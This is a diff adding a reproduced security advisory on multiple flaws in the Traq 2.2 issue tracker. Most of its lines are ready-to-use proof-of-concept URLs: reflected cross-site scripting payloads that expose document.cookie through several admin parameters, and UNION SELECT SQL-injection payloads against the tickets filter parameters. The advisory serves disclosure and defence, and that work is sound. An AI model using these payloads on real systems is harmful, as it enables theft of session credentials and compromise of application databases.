@@ -1,0 +1,42 @@
+source: http://www.securityfocus.com/bid/49835/info
+
+Traq is prone to multiple SQL-injection and cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Traq 2.2 is vulnerable; prior versions may also be affected.
+
+1) Multiple cross-site scripting vulnerabilities that affect the &#039;edit&#039; parameter of the following scripts:
+
+http://www.example.com/admincp/components.php?edit=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/admincp/ticket_templates.php?edit=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/admincp/custom_fields.php?edit=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/admincp/groups.php?edit=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+2) Multiple cross-site scripting vulnerabilities that affect the &#039;errors&#039; parameter of the following scripts:
+
+http://www.example.com/admincp/components.php?edit&error&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/sc ript%3E
+http://www.example.com/admincp/groups.php?edit&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/admincp/milestones.php?edit&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/admincp/plugins.php?create&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/admincp/projects.php?edit&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/admincp/repositories.php?edit&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/admincp/users.php?edit&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+Successful exploitation of the vulnerabilities requires that "register_globals" is enabled.
+
+3) A cross-site scripting vulnerability affects the &#039;goto&#039; parameter of the &#039;user/login&#039; script:
+
+http://www.example.com/user/login?goto=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+4) Multiple SQL-injection vulnerability affects the &#039;sort&#039;, &#039;order&#039;, &#039;component&#039;, &#039;milestone&#039;, &#039;priority&#039;, &#039;severity&#039;, &#039;status&#039;, &#039;type&#039;, &#039;version&#039; parameters of the &#039;tickets&#039; scripts:
+
+http://www.example.com/[PROJECT_ID]/tickets?sort=SQL_CODE_HERE
+http://www.example.com/[PROJECT_ID]/tickets?order=SQL_CODE_HERE
+http://www.example.com/[PROJECT_ID]/tickets?columns=ticket&component=1%29/**/union/**/select/**/1,version%28%29,3,4 ,5,6,7,8,9,10,11,12,13,14,15,16,17,18,29,20/**/from/**/traq_tickets/**/where/**/1/**/in/**/%281
+http://www.example.com/[PROJECT_ID]/tickets?columns=ticket&milestone=1%29/**/union/**/select/**/1,version%28%29,3,4 ,5,6,7,8,9,10,11,12,13,14,15,16,17,18,29,20/**/from/**/traq_tickets/**/where/**/1/**/in/**/%281
+http://www.example.com/[PROJECT_ID]/tickets?columns=ticket&priority=1%29/**/union/**/select/**/1,version%28%29,3,4, 5,6,7,8,9,10,11,12,13,14,15,16,17,18,29,20/**/from/**/traq_tickets/**/where/**/1/**/in/**/%281
+http://www.example.com/[PROJECT_ID]/tickets?columns=ticket&severity=1%29/**/union/**/select/**/1,version%28%29,3,4, 5,6,7,8,9,10,11,12,13,14,15,16,17,18,29,20/**/from/**/traq_tickets/**/where/**/1/**/in/**/%281
+http://www.example.com/[PROJECT_ID]/tickets?columns=ticket&status=1%29/**/union/**/select/**/1,version%28%29,3,4,5, 6,7,8,9,10,11,12,13,14,15,16,17,18,29,20/**/from/**/traq_tickets/**/where/**/1/**/in/**/%281
+http://www.example.com/[PROJECT_ID]/tickets?columns=ticket&type=1%29/**/union/**/select/**/1,version%28%29,3,4,5,6, 7,8,9,10,11,12,13,14,15,16,17,18,29,20/**/from/**/traq_tickets/**/where/**/1/**/in/**/%281
+http://www.example.com/[PROJECT_ID]/tickets?columns=ticket&version=1%29/**/union/**/select/**/1,version%28%29,3,4,5 ,6,7,8,9,10,11,12,13,14,15,16,17,18,29,20/**/from/**/traq_tickets/**/where/**/1/**/in/**/%281
